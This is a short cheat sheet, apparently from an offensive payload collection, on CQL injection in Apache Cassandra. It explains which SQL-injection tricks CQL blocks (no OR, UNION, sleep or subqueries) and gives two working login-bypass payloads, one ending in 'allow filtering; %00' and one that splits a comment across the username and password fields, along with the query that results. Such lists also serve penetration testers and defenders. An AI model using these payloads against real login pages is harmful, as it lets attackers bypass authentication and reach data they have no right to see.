# cassandra injection

> apache cassandra is a free and open-source distributed wide column store nosql database management system.


## summary

* [cql injection limitations](#cql-injection-limitations)
* [cassandra comment](#cassandra-comment)
* [cassandra login bypass](#cassandra-login-bypass)
    * [example #1](#example-1)
    * [example #2](#example-2)
* [references](#references) 


## cql injection limitations

* cassandra is a non-relational database, so cql doesn't support `join` or `union` statements, which makes cross-table queries more challenging. 

* additionally, cassandra lacks convenient built-in functions like `database()` or `user()` for retrieving database metadata. 

* another limitation is the absence of the `or` operator in cql, which prevents creating always-true conditions; for instance, a query like `select * from table where col1='a' or col2='b';` will be rejected. 

* time-based sql injections, which typically rely on functions like `sleep()` to introduce a delay, are also difficult to execute in cql since it doesn’t include a `sleep()` function.

* cql does not allow subqueries or other nested statements, so a query like `select * from table where column=(select column from table limit 1);` would be rejected. 


## cassandra comment

```sql
/* cassandra comment */
```


## cassandra login bypass

### example #1

```sql
username: admin' allow filtering; %00
password: any
```

### example #2

```sql
username: admin'/*
password: */and pass>'
```

the injection would look like the following sql query

```sql
select * from users where user = 'admin'/*' and pass = '*/and pass>'' allow filtering;
```


## references

- [cassandra injection vulnerability triggered - datadog - january 30, 2023](https://docs.datadoghq.com/fr/security/default_rules/appsec-cass-injection-vulnerability-trigger/)
- [investigating cql injection in apache cassandra - mehmet leblebici - december 2, 2022](https://www.invicti.com/blog/web-security/investigating-cql-injection-apache-cassandra/)